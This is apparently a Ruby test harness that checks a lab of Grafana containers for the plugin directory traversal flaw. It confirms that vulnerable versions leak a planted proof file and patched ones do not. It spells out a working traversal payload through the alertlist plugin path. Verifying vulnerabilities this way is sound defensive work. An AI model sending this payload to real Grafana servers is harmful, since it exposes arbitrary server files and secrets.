# frozen_string_literal: true

require 'json'
require 'net/http'
require 'open3'

runtime = JSON.parse(File.read(ENV.fetch('MODULE_TARGET_RUNTIME')))
versions = { 'v806' => '8.0.6', 'v807' => '8.0.7', 'v817' => '8.1.7', 'v818' => '8.1.8', 'v826' => '8.2.6', 'v827' => '8.2.7', 'v830' => '8.3.0', 'v831' => '8.3.1', 'prefix' => '8.3.0' }
vulnerable = %w[v806 v817 v826 v830 prefix]
proof = File.binread('test/module_targets/grafana_traversal/proof.txt')
commands = []
requests = []
profiles = {}
evidence = { commands: commands, requests: requests, profiles: profiles }
native = lambda do |*arguments|
  argv = runtime.fetch('compose') + arguments
  stdout, stderr, status = Open3.capture3(*argv)
  stdout.force_encoding(Encoding::UTF_8)
  raise 'Native textual command output is not UTF-8' unless stdout.valid_encoding?

  commands << { argv: argv, stdout: stdout, stderr: stderr, exitstatus: status.exitstatus }
  raise "Native command failed: #{commands.last.inspect}" unless status.success?

  stdout
end
request = lambda do |service, path|
  endpoint = runtime.fetch('endpoints').fetch(service)
  http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
  http.open_timeout = 3
  http.read_timeout = 5
  response = http.get(path)
  response.body.force_encoding(Encoding::UTF_8)
  raise 'Native textual HTTP body is not UTF-8' unless response.body.valid_encoding?

  requests << { service: service, path: path, status: response.code.to_i, headers: response.to_hash, body: response.body }
  response
end
traversal = '/public/plugins/alertlist/' + ('../' * 13) + 'etc/grafana/module-target-proof.txt'
begin
  versions.each do |service, version|
    prefix = service == 'prefix' ? '/observability' : ''
    cli = native.call('exec', '-T', service, 'grafana-server', '-v')
    raise "Native version differs: #{service}" unless cli.include?("Version #{version} ")
    raise "Native proof differs: #{service}" unless native.call('exec', '-T', service, 'cat', '/etc/grafana/module-target-proof.txt').b == proof

    health = request.call(service, prefix + '/api/health')
    raise "Native health differs: #{service}" unless health.code == '200' && JSON.parse(health.body).values_at('database', 'version') == ['ok', version]

    login = request.call(service, prefix + '/login')
    raise "Native login page missing: #{service}" unless login.code == '200' && login.body.include?('Grafana')

    denied = request.call(service, prefix + '/api/admin/stats')
    raise "Native admin endpoint is not denied: #{service}" unless denied.code == '401'

    leaked = request.call(service, prefix + traversal)
    if vulnerable.include?(service)
      raise "Native traversal did not recover exact proof: #{service}" unless leaked.code == '200' && leaked.body.b == proof
    elsif leaked.code == '200' || leaked.body.b == proof
      raise "Native fixed target disclosed proof: #{service}"
    end
    profiles[service] = { version: version, vulnerable: vulnerable.include?(service), cli: cli, health: JSON.parse(health.body), login: login.body, traversal_status: leaked.code.to_i }
  end

  {
    missing_plugin: '/public/plugins/module-target-plugin-not-installed/' + ('../' * 13) + 'etc/grafana/module-target-proof.txt',
    missing_file: '/public/plugins/alertlist/' + ('../' * 13) + 'etc/grafana/module-target-file-does-not-exist',
    insufficient_depth: '/public/plugins/alertlist/etc/grafana/module-target-proof.txt'
  }.each do |label, path|
    response = request.call('v830', path)
    raise "Native negative disclosed content: #{label}" if response.code == '200' || response.body.b == proof
  end
  unrelated = request.call('unrelated', '/')
  raise 'Native unrelated Apache differs' unless unrelated.code == '200' && unrelated.body.include?('module-target-http-marker')
ensure
  puts JSON.pretty_generate(evidence)
end
